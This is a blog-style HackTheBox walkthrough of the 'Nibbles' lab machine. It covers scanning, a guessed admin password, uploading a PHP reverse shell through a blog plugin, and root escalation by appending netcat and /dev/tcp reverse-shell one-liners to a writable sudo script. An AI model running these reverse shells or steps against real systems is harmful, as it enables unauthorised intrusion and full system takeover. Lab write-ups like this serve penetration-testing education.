---
layout: post
title: "Nibbles"
categories: HTB-Walkthrough
---

![nibbles](/assets/img/nibbles.png)

Nmap first...Im not sure why, but my first scan only picked up port 22, I tried again and got a better result...

`nmap -sV -Pn 10.10.10.75 |tee -a nib.txt`

Still, there's only 2 ports that seem to be open...

```

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Apache httpd 2.4.18 ((Ubuntu))
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

```


Browsing to http://10.10.10.75 we see "Hello World" message, but the page is empty, looks like it's in development.
Checking out the source we get a nice surprise....

```

<!-- /nibbleblog/ directory. Nothing interesting here! -->


```

OK, so taking the hint, we give it a go...It takes us to a pretty empty blog page.

Lets crank up gobuster, and see what we can find. 

`gobuster dir -u http://10.10.10.75/nibbleblog/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -t50 -x .php,.txt,.html`

```

/sitemap.php (Status: 200)
/index.php (Status: 200)
/content (Status: 301)
/themes (Status: 301)
/feed.php (Status: 200)
/admin (Status: 301)
/admin.php (Status: 200)
/plugins (Status: 301)
/install.php (Status: 200)
/update.php (Status: 200)
/README (Status: 200)
/languages (Status: 301)
/LICENSE.txt (Status: 200)
/COPYRIGHT.txt (Status: 200)

```

Instantly our eye is drawn to `/admin.php` 
Its a login page.

Since its an admin login, i decided to try admin/admin...it failed...
Sticking with admin username for now, I tried 'nibbles' as the password since it's the name of the box...and it worked!!!


having a poke about, I find we can possibly upload an image file (containing a reverse-shell) to the server...

```
http://10.10.10.75/nibbleblog/content/private/plugins/my_image/
```

We can upload pentestmonkey's [php-reverse-shell](http://pentestmonkey.net/tools/web-shells/php-reverse-shell) which I've saved as evil.php
Just modify the contents to reflect our IP and preferred port for the connection...

Once uploaded, we can execute the shell by browsing to the folder where the server stores it.

`/content/private/plugins/my_image/evil.php`

.....eh? It didn't work....

Sometimes a server will change the name of a file for storage...perhaps because its hardcoded in other php files for convenience.

I try...
```
/content/private/plugins/my_image/image.php
```

and catch the shell on 6969.

```

listening on [any] 6969 ...
connect to [10.10.14.12] from (UNKNOWN) [10.10.10.75] 56026
Linux Nibbles 4.4.0-104-generic #127-Ubuntu SMP Mon Dec 11 12:16:42 UTC 2017 x86_64 x86_64 x86_64 GNU/Linux
 17:44:47 up  1:39,  0 users,  load average: 0.00, 0.00, 0.00
USER     TTY      FROM             LOGIN@   IDLE   JCPU   PCPU WHAT
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
/bin/sh: 0: can't access tty; job control turned off
$ id
uid=1001(nibbler) gid=1001(nibbler) groups=1001(nibbler)
$ whoami
nibbler
$

```

Go to the /home/nibbler directory, and find user.txt

```

$ cat user.txt
b0xxxxxxxxxxxxxxxxxxxxxxxxxxxxd8

```

Looking at the directory contents, we find something interesting...

```

$ ls -la
total 20
drwxr-xr-x 3 nibbler nibbler 4096 Dec 29  2017 .
drwxr-xr-x 3 root    root    4096 Dec 10  2017 ..
-rw------- 1 nibbler nibbler    0 Dec 29  2017 .bash_history
drwxrwxr-x 2 nibbler nibbler 4096 Dec 10  2017 .nano
-r-------- 1 nibbler nibbler 1855 Dec 10  2017 personal.zip
-r-------- 1 nibbler nibbler   33 Dec 10  2017 user.txt


```

One of the first commands I run when trying to escalate privileges (besides `sudo su`),
is `sudo -l`.
It sometimes lists the commands an user can execute with sudo without having to enter a password...

```

$ sudo -l

sudo: unable to resolve host Nibbles: Connection timed out
Matching Defaults entries for nibbler on Nibbles:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin

User nibbler may run the following commands on Nibbles:
    (root) NOPASSWD: /home/nibbler/personal/stuff/monitor.sh


```

Looks like we have to unzip `personal.zip`

```

$ unzip personal.zip
Archive:  personal.zip
   creating: personal/
   creating: personal/stuff/
  inflating: personal/stuff/monitor.sh  
$ ls
personal
personal.zip
user.txt
$ 

```

We find `monitor.sh` inside the unzipped folder...

```

$ cd personal
$ l
/bin/sh: 16: l: not found
$ ls
stuff
$ cd stuff
$ ls
monitor.sh
$ ls -la
total 12
drwxr-xr-x 2 nibbler nibbler 4096 Dec 10  2017 .
drwxr-xr-x 3 nibbler nibbler 4096 Dec 10  2017 ..
-rwxrwxrwx 1 nibbler nibbler 4015 May  8  2015 monitor.sh
$ 


```

Looks like anyone can execute monitor.sh, but we know we can execute it as root with the sudo command.
We can also write to the file, 

```

$ echo "rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.14.20 999 >/tmp/f" >> monitor.sh
$ sudo /home/nibbler/personal/stuff/monitor.sh

```

And we catch the root shell on 999

```

nc -nlvp 999
listening on [any] 999 ...
connect to [10.10.14.20] from (UNKNOWN) [10.10.10.75] 37444
/bin/sh: 0: can't access tty; job control turned off
# cat /root/root.txt
b6xxxxxxxxxxxxxxxxxxxxxxxxxxxx8c
# whoami
root
# 
 
```

alternatively we could just replace the file

```


mv monitor.sh monitor-old.sh

cat > monitor.sh << _EOF
#!/bin/bash
bash -i >& /dev/tcp/10.10.14.20/999 0>&1;
_EOF
~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~~
$ sudo /home/nibbler/personal/stuff/monitor.sh


```


again catching the root shell on 999.



:)


